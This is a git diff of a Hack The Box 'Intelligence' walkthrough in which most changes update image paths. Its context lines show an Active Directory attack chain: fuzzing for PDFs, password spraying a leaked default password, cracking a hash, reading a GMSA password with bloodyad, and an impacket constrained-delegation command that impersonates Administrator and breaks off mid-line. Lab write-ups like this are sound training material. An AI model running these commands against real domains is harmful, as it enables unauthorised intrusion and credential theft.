@@ -5,7 +5,7 @@
 #windows #web #AD #fuzzing #spraying #Responder #scripting #leaked_creds #GMSA #constrained_delegation
 
 ## Recon
-![Pasted image 20260909104023.png](/img/user/Pasted%20image%2020260909104023.png)
+![Pasted image 20260909104023.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260909104023.png)
 
 ### Nmap:
 ```zsh
@@ -89,13 +89,13 @@ Nmap done: 1 IP address (1 host up) scanned in 114.94 seconds
 ```
 Initial portscans reveal the common suite of windows ports and a webserver up on port 80. Adding `intelligence.htb` to my `/etc/hosts` file.
 ### Port 80 (Webserver)
-![Pasted image 20260909104128.png](/img/user/Pasted%20image%2020260909104128.png)
+![Pasted image 20260909104128.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260909104128.png)
 Visiting port 80 in the browser reveals a pretty stock web server.
 
-![Pasted image 20260909111126.png](/img/user/Pasted%20image%2020260909111126.png)
+![Pasted image 20260909111126.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260909111126.png)
 Scrolling further we see links for two different apparent documents
 
-![Pasted image 20260909111331.png](/img/user/Pasted%20image%2020260909111331.png)
+![Pasted image 20260909111331.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260909111331.png)
 Clicking through we see uploads of Lorem Ipsum as PDFs that are named with a date and `-upload.pdf`. Manually enumerating the dates we see that there are entries for many days in the year 2020. We can fuzz this to find all valid PDFs.
 
 ```zsh
@@ -266,7 +266,7 @@ ________________________________________________
 ```
 We then use `ffuf` with custom variable names for each list `MON` and `DAY` respectively to fuzz all entries for the year 2020 from every month in that year. This was our output. It gave us 16 different PDFs.
 
-![Pasted image 20260909112607.png](/img/user/Pasted%20image%2020260909112607.png)
+![Pasted image 20260909112607.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260909112607.png)
 Visiting every result in the browser revealed to be Lorem Ipsum except for `http://intelligence.htb/documents/2020-12-30-upload.pdf` which gave us a very brief but verbose "Internal IT update" where a user `Ted` has a script in place to notify them of web outages and that the department has yet to lockdown all of their service accounts. This could be very useful for us.
 
 After several headscratching hours I decided to reformat the months file so that they'll all be two digit lengths and got this output:
@@ -720,7 +720,7 @@ ________________________________________________
 
 ```
 
-![Pasted image 20260910133208.png](/img/user/Pasted%20image%2020260910133208.png)
+![Pasted image 20260910133208.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260910133208.png)
 We finally come across another blog entry from 6/4/2020 that's not lorem ipsum and it has a default credential for all new users: `NewIntelligenceCorpUser9876`. Let's try authenticating as `Ted` with the default creds.
 
 No dice. See [[CTFs/HTB/Intelligence#Initial Access\|#Initial Access]] for more.
@@ -800,7 +800,7 @@ Banner grabbing and enumerating null and Guest share access reveals this machine
 
 ## Initial Access
 ### Leaked credentials
-![Pasted image 20260910134721.png](/img/user/Pasted%20image%2020260910134721.png)
+![Pasted image 20260910134721.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260910134721.png)
 Running `exiftool` on the IT update pdf we see it was made by user `Jason.Patterson`.
 
 ```zsh
@@ -1033,7 +1033,7 @@ SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
-SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC              --> [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
 
 ```
 We password spray our known default password in conjunction with our known user list and get access to the machine as `Tiffany.Molina`.
@@ -1190,7 +1190,7 @@ LDAP        10.129.95.154   389    DC               Resolved collection methods:
 LDAP        10.129.95.154   389    DC               Done in 0M 23S
 LDAP        10.129.95.154   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.95.154_2026-09-15_125057_bloodhound.zip
 ```
-![Pasted image 20260915100622.png\|1295](/img/user/Pasted%20image%2020260915100622.png)
+![Pasted image 20260915100622.png\|1295](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260915100622.png)
 As well as generated a bloodhound collection archive to look over.
 
 ```powershell
@@ -1322,12 +1322,12 @@ SMB         10.129.95.154   445    DC               [+] intelligence.htb\Ted.Gra
 ```
 We successfully crack the hash for `Ted.Graves` with `jtr` in just a couple seconds and confirm the successful login with netexec.
 
-![Pasted image 20260915111925.png](/img/user/Pasted%20image%2020260915111925.png)
+![Pasted image 20260915111925.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260915111925.png)
 Looking at our bloodhound output from earlier we see that our newly compromised user is a member of the ITSUPPORT group which can read the GMSA password for the `SVC_INT$` service/machine account which has the `AllowedToDelegate` attribute assigned to it for our target DC. This means we can use delegation to impersonate any user on the DC including `Administrator`.
 
 ## Privilege Escalation
 ### GMSA Password leak into Constrained Delegation
-![Pasted image 20260915114558.png](/img/user/Pasted%20image%2020260915114558.png)
+![Pasted image 20260915114558.png](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260915114558.png)
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/HTB/intelligence]
 └─$ bloodyad --host 10.129.95.154 -d "intelligence.htb" -u "Ted.Graves" -p "Mr.Teddy" get object "SVC_INT$" --attr msDS-ManagedPassword
@@ -1339,8 +1339,8 @@ msDS-ManagedPassword.B64ENCODED: 36TueccWaZ78QzqVg5VYL8ICd7NBBV+NNZdiDc/T/D86mde
 ```
 Our first pivot from `Ted.Graves` will be into the `SVC_INT$` service account. Since we have permission to read the password for it, we can use `bloodyad` to read out the NT hash directly.
 
-![Pasted image 20260915114848.png\|542](/img/user/Pasted%20image%2020260915114848.png)![Pasted image 20260915114911.png\|619](/img/user/Pasted%20image%2020260915114911.png)
-Next, we can use this hash to performed a Constrained Delegation attack on the target DC. This will allow us to impersonate any valid user on the DC including the `Administrator` user.
+![Pasted image 20260915114848.png\|542](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260915114848.png)![Pasted image 20260915114911.png\|619](/img/user/CTFs/HTB/Images/Intelligence%20Images/Pasted%20image%2020260915114911.png)
+Next, we can use this hash to performed a Constrained Delegation attack on the target DC. This will allow us to impersonate any valid user on the DC including the `Administrator` user and steal their Kerberos Service Ticket.
 
 ```zsh
 └─$ faketime '21:59' impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :4de450f51af61cf1e67e982965aca00c 'intelligence.htb/SVC_INT
